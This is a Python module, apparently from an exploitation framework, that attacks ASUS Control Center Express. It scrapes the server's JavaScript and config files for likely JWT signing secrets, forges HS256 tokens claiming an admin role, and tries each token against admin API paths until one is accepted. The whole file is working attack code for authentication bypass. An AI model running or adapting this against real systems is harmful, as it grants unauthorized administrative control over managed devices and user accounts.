#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ASUS Control Center Express HTTP helpers (JWT discovery / forge)."""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from typing import Any, Dict, Iterator, List, Optional, Tuple

from core.framework.base_module import BaseModule

ASSET_PATHS = (
    "/",
    "/index.html",
    "/login",
    "/app.js",
    "/main.js",
    "/bundle.js",
    "/static/js/main.js",
    "/js/app.js",
    "/assets/index.js",
    "/config.json",
    "/api/config",
    "/js/config.js",
)

ADMIN_API_PATHS = (
    "/api/user/list",
    "/api/users",
    "/api/account/list",
    "/api/system/info",
    "/api/device/list",
    "/api/policy/list",
    "/api/admin/info",
    "/api/settings",
)

_KEYWORD = re.compile(r"(secret|jwt|sign|hmac|private|apikey|api_key|token_?key)", re.I)
_CANDIDATE = re.compile(r"""["']([A-Za-z0-9+/=_-]{16,80})["']""")
_ASSIGN = re.compile(r"(?:key|secret)\s*[:=]\s*[\"']([^\"']{12,80})[\"']", re.I)


class Asus_accx(BaseModule):
    """Mixin for ASUS Control Center Express modules."""

    @staticmethod
    def accx_fingerprint(body: str, server_header: str = "") -> bool:
        blob = f"{server_header} {body or ''}".lower()
        return "accx" in blob or "control center" in blob

    @staticmethod
    def jwt_b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    @classmethod
    def jwt_hs256(cls, payload: dict, key: str) -> str:
        head = cls.jwt_b64url(
            json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode()
        )
        body = cls.jwt_b64url(json.dumps(payload, separators=(",", ":")).encode())
        msg = f"{head}.{body}".encode()
        sig = hmac.new(str(key).encode(), msg, hashlib.sha256).digest()
        return f"{head}.{body}.{cls.jwt_b64url(sig)}"

    @classmethod
    def accx_forge_claims(cls, user: str = "admin") -> Iterator[dict]:
        now = int(time.time())
        base = {
            "sub": user,
            "username": user,
            "user": user,
            "name": user,
            "role": "admin",
            "is_admin": True,
            "admin": True,
            "iat": now,
            "nbf": now - 30,
            "exp": now + 3600,
        }
        yield dict(base)
        yield {k: v for k, v in base.items() if k in ("sub", "exp")}
        yield {k: v for k, v in base.items() if k in ("username", "role", "exp")}
        yield {k: v for k, v in base.items() if k in ("user", "is_admin", "exp")}
        yield {"data": {"username": user, "role": "admin"}, "exp": now + 3600}

    @classmethod
    def accx_score_key(cls, value: str, base_score: int = 1) -> int:
        score = base_score
        if len(value) in (16, 24, 32, 48, 64):
            score += 2
        if re.fullmatch(r"[A-Za-z0-9+/=]{24,}", value):
            score += 1
        return score

    @classmethod
    def accx_parse_key_candidates(cls, text: str) -> Dict[str, int]:
        found: Dict[str, int] = {}
        if not text:
            return found
        for line in text.splitlines():
            if not _KEYWORD.search(line):
                continue
            for match in _CANDIDATE.finditer(line):
                val = match.group(1)
                found[val] = max(found.get(val, 0), cls.accx_score_key(val))
        for match in _ASSIGN.finditer(text):
            val = match.group(1)
            found[val] = max(found.get(val, 0), cls.accx_score_key(val, base_score=3))
        return found

    def accx_harvest_keys(self) -> List[str]:
        ranked: Dict[str, int] = {}
        for path in ASSET_PATHS:
            resp = self.http_request("GET", path, timeout=12)
            if not resp or int(resp.status_code or 0) != 200:
                continue
            text = resp.text or ""
            for key, score in self.accx_parse_key_candidates(text).items():
                ranked[key] = max(ranked.get(key, 0), score)
        ordered = sorted(ranked.items(), key=lambda item: -item[1])
        return [key for key, _ in ordered]

    def accx_probe_token(self, token: str, admin_path: str) -> Tuple[int, str]:
        resp = self.http_request(
            "GET",
            admin_path,
            headers={"Authorization": f"Bearer {token}"},
            timeout=12,
        )
        if not resp:
            return 0, ""
        return int(resp.status_code or 0), (resp.text or "")[:500]

    def accx_forge_admin_token(
        self,
        keys: List[str],
        user: str = "admin",
    ) -> Optional[Tuple[str, str, str]]:
        for key in keys:
            for claims in self.accx_forge_claims(user):
                token = self.jwt_hs256(claims, key)
                for path in ADMIN_API_PATHS:
                    code, body = self.accx_probe_token(token, path)
                    if code == 200 and len(body) > 2:
                        return token, path, key
        return None